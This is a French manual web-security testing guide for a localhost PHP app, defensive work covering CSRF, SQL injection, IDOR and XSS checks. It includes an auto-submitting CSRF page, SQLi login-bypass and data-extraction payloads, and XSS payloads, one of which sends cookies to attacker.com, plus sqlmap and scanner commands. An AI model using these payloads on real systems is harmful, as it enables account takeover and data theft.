# 🧪 GUIDE DE TESTS MANUELS DE SÉCURITÉ

## 📋 CHECKLIST DE TESTS

### ✅ Tests automatisés déjà créés
- [x] **12 tests PHPUnit** dans `SecurityTest.php`
- [x] CSRF (3 tests)
- [x] SQL Injection (3 tests)
- [x] IDOR (3 tests)
- [x] XSS (3 tests)

---

## 🔥 TESTS MANUELS COMPLÉMENTAIRES

### 1️⃣ **TEST CSRF - Manual Verification**

#### Test A : Formulaire d'inscription sans protection
```bash
# 1. Ouvrir la page d'inscription
curl -X POST http://localhost:8000/account/register \
  -d "name=Hacker&surname=Evil&email=test@evil.com&password=Pass123!&adresse=Dark" \
  -H "Content-Type: application/x-www-form-urlencoded"

# ✅ ATTENDU : Redirection ou erreur 403
# ❌ CRITIQUE : Si l'utilisateur est créé → FAILLE CSRF
```

#### Test B : Suppression d'utilisateur via CSRF externe
```html
<!-- Créer un fichier malicious.html -->
<form action="http://localhost:8000/admin/delete/5" method="POST" id="evil">
    <input type="submit" value="Cliquez ici pour gagner 1000€">
</form>
<script>document.getElementById('evil').submit();</script>
```

**Procédure :**
1. Se connecter en tant qu'admin
2. Ouvrir `malicious.html` dans un nouvel onglet
3. ✅ **ATTENDU** : Suppression bloquée (CSRF token manquant)
4. ❌ **CRITIQUE** : Si l'utilisateur est supprimé → FAILLE CSRF

---

### 2️⃣ **TEST SQL INJECTION - Exploitation manuelle**

#### Test A : Login Bypass
```bash
# Payloads classiques
Payload 1: admin' OR '1'='1
Payload 2: ' OR 1=1--
Payload 3: admin'/*
Payload 4: ' UNION SELECT NULL, NULL--
```

**Procédure avec navigateur :**
1. Aller sur `/account/login`
2. Username : `admin' OR '1'='1`
3. Password : `anything`
4. Soumettre le formulaire
5. ✅ **ATTENDU** : Échec de connexion
6. ❌ **CRITIQUE** : Connexion réussie → FAILLE SQLi

#### Test B : Extraction de données sensibles
```sql
-- Dans un champ recherche (si existe)
' UNION SELECT email, password FROM user--
' UNION SELECT table_name FROM information_schema.tables--
```

**Procédure :**
1. Injecter le payload dans le champ de recherche
2. ✅ **ATTENDU** : Erreur ou résultat vide sécurisé
3. ❌ **CRITIQUE** : Affichage de données → FAILLE SQLi

#### Test C : Blind SQL Injection
```bash
# Test avec Burp Suite ou manuellement
Username: admin' AND SLEEP(5)--
Password: anything

# ✅ ATTENDU : Réponse immédiate
# ❌ CRITIQUE : Délai de 5 secondes → Blind SQLi possible
```

---

### 3️⃣ **TEST IDOR - Insecure Direct Object Reference**

#### Test A : Modification de compte via ID manipulation
```bash
# 1. Se connecter en tant qu'user ID=5
# 2. Capturer la requête POST /account/update avec Burp
# 3. Modifier le payload pour inclure :

POST /account/update
{
  "user_id": 10,  # ID d'un autre utilisateur
  "name": "Hacked",
  "email": "victim@test.com"
}

# ✅ ATTENDU : 403 Forbidden ou vérification "user_id != session user"
# ❌ CRITIQUE : Modification réussie → FAILLE IDOR
```

#### Test B : Accès direct aux ressources
```bash
# Test avec curl
curl -b cookies.txt http://localhost:8000/account/profile/10

# ✅ ATTENDU : 403 ou redirection si l'ID ne correspond pas à l'utilisateur connecté
# ❌ CRITIQUE : Affichage du profil d'autrui → FAILLE IDOR
```

#### Test C : Enumeration d'utilisateurs
```bash
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}" \
    http://localhost:8000/account/$i
done

# ✅ ATTENDU : 403/404 pour tous les ID sauf le sien
# ❌ CRITIQUE : 200 OK pour d'autres ID → Enumeration possible
```

---

### 4️⃣ **TEST XSS - Cross-Site Scripting**

#### Test A : XSS Reflected dans URL
```bash
# Payloads à tester
http://localhost:8000/products?search=<script>alert('XSS')</script>
http://localhost:8000/account?name=<img src=x onerror=alert(1)>
http://localhost:8000/checkout?error=<svg/onload=alert('XSS')>
```

**Procédure :**
1. Ouvrir l'URL dans le navigateur
2. ✅ **ATTENDU** : `<script>` affiché comme texte échappé
3. ❌ **CRITIQUE** : Popup JavaScript → XSS Reflected

#### Test B : XSS Stored (Persistent)
```bash
# 1. Créer un compte avec :
Name: <script>alert(document.cookie)</script>
Adresse: <img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>

# 2. Se reconnecter et visiter /account
# ✅ ATTENDU : Texte affiché de manière sûre
# ❌ CRITIQUE : Popup ou requête vers attacker.com → XSS Stored
```

#### Test C : XSS dans attributs HTML
```html
<!-- Tester avec :
Name: " onmouseover="alert(1)
Adresse: "><svg/onload=alert(1)>
-->
```

**Vérification du code HTML généré :**
```html
<!-- ✅ SÉCURISÉ -->
<input value="&quot; onmouseover=&quot;alert(1)">

<!-- ❌ VULNÉRABLE -->
<input value="" onmouseover="alert(1)">
```

---

## 🛠️ **OUTILS RECOMMANDÉS**

### 1. **Burp Suite Community**
```bash
# Installation
sudo apt install burpsuite  # Linux
# ou télécharger depuis https://portswigger.net/burp/communitydownload
```

**Usage :**
- Intercepter les requêtes POST
- Modifier les paramètres en temps réel
- Répéter les requêtes avec différents payloads

### 2. **OWASP ZAP (Zed Attack Proxy)**
```bash
# Installation
sudo apt install zaproxy

# Scan automatique
zap-cli quick-scan http://localhost:8000
```

### 3. **SQLMap (SQL Injection)**
```bash
# Installation
sudo apt install sqlmap

# Test sur formulaire de connexion
sqlmap -u "http://localhost:8000/account/login" \
  --data="username=test&password=test" \
  --level=5 --risk=3
```

### 4. **XSSer (XSS Detection)**
```bash
# Installation
pip install xsser

# Scan
xsser -u "http://localhost:8000/products?search=XSS" --auto
```

---

## 📊 **RAPPORT DE TEST - Template**

```markdown
# RAPPORT DE TEST SÉCURITÉ
Date : [DATE]
Testeur : [NOM]
Version : [VERSION_APP]

## RÉSULTATS

### CSRF
- [ ] ✅ Formulaire inscription protégé
- [ ] ✅ Mise à jour compte protégée
- [ ] ✅ Suppression admin protégée
- [ ] ❌ FAILLE : [Détails]

### SQL INJECTION
- [ ] ✅ Login résiste aux payloads
- [ ] ✅ Recherche sécurisée
- [ ] ✅ Inscription protégée
- [ ] ❌ FAILLE : [Détails]

### IDOR
- [ ] ✅ Modification compte vérifiée
- [ ] ✅ Accès profil restreint
- [ ] ✅ Suppression autorisée uniquement admin
- [ ] ❌ FAILLE : [Détails]

### XSS
- [ ] ✅ Reflected XSS bloqué
- [ ] ✅ Stored XSS échappé
- [ ] ✅ DOM XSS non exploitable
- [ ] ❌ FAILLE : [Détails]

## RECOMMANDATIONS
1. [Action 1]
2. [Action 2]

## SCORE GLOBAL : [X/10]
```

---

## 🚀 **EXÉCUTION DES TESTS**

### Tests automatisés
```bash
# Lancer tous les tests de sécurité
php bin/phpunit tests/Security/SecurityTest.php

# Lancer un test spécifique
php bin/phpunit --filter testSqlInjectionInLoginEmail
```

### Tests manuels
```bash
# 1. Créer un script de test rapide
bash scripts/quick_security_test.sh

# 2. Utiliser Burp Suite pour interception
# 3. Documenter les résultats dans le rapport
```

---

## ⚠️ **AVERTISSEMENT**

**CES TESTS DOIVENT ÊTRE EFFECTUÉS UNIQUEMENT SUR VOTRE ENVIRONNEMENT DE DÉVELOPPEMENT/TEST.**

- ❌ **JAMAIS** sur un environnement de production
- ❌ **JAMAIS** sur une application dont vous n'êtes pas propriétaire
- ✅ Toujours avec autorisation écrite
- ✅ Dans un environnement isolé

**Le test de sécurité non autorisé est illégal dans la plupart des pays.**

---

## 📚 **RESSOURCES SUPPLÉMENTAIRES**

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [PentesterLab](https://pentesterlab.com/)